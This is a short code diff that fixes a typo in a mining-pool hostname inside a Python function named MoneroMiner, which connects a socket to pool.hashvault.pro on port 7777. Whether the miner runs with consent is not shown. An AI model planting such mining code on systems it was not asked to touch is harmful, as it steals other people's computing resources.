@@ -54,7 +54,7 @@ def MoneroMiner():
 
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(('pool.hasvault.pro', 7777))
+        sock.connect(('pool.hashvault.pro', 7777))
     except socket.gaierror as e:
         print(f"Error connecting to pool: {e}")
         return
